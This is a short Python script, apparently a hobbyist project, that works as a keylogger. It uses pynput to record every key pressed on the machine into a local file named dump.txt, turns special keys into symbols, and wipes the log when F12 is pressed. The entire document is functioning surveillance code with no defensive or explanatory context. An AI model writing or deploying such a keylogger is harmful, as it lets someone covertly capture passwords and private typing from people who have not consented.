

from pynput.keyboard import Listener
with open("dump.txt", "w", encoding="utf-8") as first:
        first.write("                  * By: DgHung")
        first.write("\n =============================\n || tab = ⇋                ||\n || backspace = ↞          || \n || delete = ↠             ||\n =============================\n")
# open('dump.txt', 'w').close() #clear text file

notAcceptKey = ["ă","â","ê","ô","̀","̀","̉","̃","́","̣","đ","₫","Ă","Â","Ê","Ô"]

def anonymous(key):
    key = str(key).replace("'","")
    if key == "Key.f12":
        open('dump.txt', 'w').close()
        raise SystemExit(0) #tắt chương trình
    if key in notAcceptKey: key = ""
    if key == "Key.enter":
        key = '\n'
    if key == "Key.space":
        key = ' '
    if key == "Key.ctrl_l" or key == "Key.ctrl_r" or key == "Key.shift" or key == "Key.shift_r" or key == "Key.alt_gr" or key == "Key.alt_l":
        key = ''

    if key == 'Key.backspace':
        key = '↞'
    if key == 'Key.delete':
        key = '↠'

    if key == 'Key.left':
        key = '←'
    if key == 'Key.up':
        key = '↑'
    if key == 'Key.right':
        key = '→'
    if key == 'Key.down':
        key = '↓'

    if key == "Key.tab":
        key = '⇋'
    if key == "Key.cmd":
        key = '⊞'
    with open("dump.txt", "a", encoding="utf-8") as logFile:
        logFile.write(key)
    print(key) 

with Listener(on_press = anonymous) as getKey:
    getKey.join()
